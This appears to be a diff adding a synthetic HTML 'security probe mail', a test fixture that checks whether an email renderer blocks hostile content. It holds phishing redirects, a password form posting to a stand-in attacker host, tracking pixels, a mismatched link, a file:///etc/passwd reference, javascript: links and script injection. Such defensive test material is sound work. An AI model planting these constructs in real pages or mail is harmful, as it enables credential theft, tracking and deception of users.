@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="refresh" content="0; url=https://phish.example.net/login">
+<base href="https://attacker.example.net/">
+<link rel="stylesheet" href="https://cdn.example.net/track.css">
+<style>
+@import url("https://cdn.example.net/import.css");
+@font-face { font-family: Probe; src: url("https://fonts.example.net/probe.woff2") format("woff2"); }
+body { font-family: Helvetica, Arial, sans-serif; margin: 20px; background: url("https://track.example.net/bg.gif?u=42"); }
+.box { border: 1px solid #c00; padding: 12px; margin-bottom: 12px; }
+.probe { font-family: Probe, serif; }
+.lazy:hover { background: url("https://track.example.net/hover.gif"); }
+@media print { body { background: url("https://track.example.net/print.gif"); } }
+</style>
+<script>document.location = "https://phish.example.net/";</script>
+</head>
+<body onload="alert(1)">
+<div class="box"><b>Security probe mail</b> (synthetic). Every reference below should be refused by the provider and nothing should navigate.</div>
+<div class="box">Tracking pixel: <img src="https://track.example.net/open.gif?id=42" width="1" height="1" alt=""></div>
+<div class="box">Relative image (resolves against &lt;base&gt;): <img src="logo.png" alt="[relative image]"></div>
+<div class="box">File URL: <img src="file:///etc/passwd" alt="[file url]"></div>
+<div class="box">Iframe: <iframe src="https://attacker.example.net/frame" width="200" height="40"></iframe></div>
+<div class="box">Form: <form action="https://phish.example.net/collect" method="post"><input name="password" type="password" placeholder="password"><button>Sign in</button></form></div>
+<div class="box"><a href="https://phish.example.net/login" title="https://bank.example.org/">https://bank.example.org/secure</a> (displayed text differs from target)</div>
+<div class="box"><a href="javascript:alert(1)">javascript: link</a> &middot; <a href="data:text/html,hi">data: link</a></div>
+<div class="box probe">Remote web font (should fall back to serif)</div>
+<div class="box" style="background-image:url('https://track.example.net/inline-bg.gif')">Inline style background</div>
+<object data="https://attacker.example.net/obj.swf" width="10" height="10"></object>
+<embed src="https://attacker.example.net/embed.swf" width="10" height="10">
+<video src="https://attacker.example.net/v.mp4" poster="https://track.example.net/poster.jpg" width="100" height="20"></video>
+<div class="box" style="width:999999px">Very wide element</div>
+<div class="box">Deep nesting: <span>
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>deep</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></span></div>
+</body></html>
